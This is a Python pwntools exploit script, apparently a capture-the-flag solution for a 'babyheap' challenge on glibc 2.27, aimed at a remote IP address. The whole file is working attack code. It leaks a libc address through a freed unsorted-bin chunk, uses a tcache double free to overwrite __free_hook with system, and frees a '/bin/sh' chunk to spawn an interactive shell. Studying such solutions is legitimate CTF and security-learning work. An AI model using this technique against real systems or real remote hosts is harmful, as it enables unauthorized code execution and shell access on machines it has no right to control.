#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./babyheap")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("161.97.176.150", 5555)

def alloc(index, size, data):
    r.recv()
    r.sendline("1")
    sleep(1)
    r.recvline()
    r.sendline(str(size))
    sleep(1)
    r.recvline()
    r.sendline(str(index))
    sleep(1)
    r.recvline()
    r.send(data)
    sleep(1)

def free(index):
    r.recv()
    sleep(1)
    r.sendline("3")
    sleep(1)
    r.recvline()
    r.sendline(str(index))
    sleep(1)

def show(index):
    r.recv()
    r.sendline("2")
    sleep(1)
    r.recvline()
    r.sendline(str(index))
    sleep(1)

def main():
    
    alloc(0, 0x430, b"MAHER")
    alloc(1, 0x10, b"MAHER")
    free(0)
    show(0)
    sleep(1)
    r.recvuntil("Your data that you requested:")
    r.recvline()
    sleep(1)
    LIBC_LEAK = u64(r.recv(6).ljust(8, p8(0)))
    log.warn("LIBC Leak @ 0x%x", LIBC_LEAK)
    libc.address = LIBC_LEAK - libc.sym["main_arena"] - 96
    
    # Double free here.
    free(1)
    free(1)

    alloc(2, 0x10, p64(libc.sym['__free_hook']))
    alloc(3, 0x10, b"/bin/sh")
    alloc(4, 0x10, p64(libc.sym['system']))
    free(3)

    r.interactive()


if __name__ == "__main__":
    main()
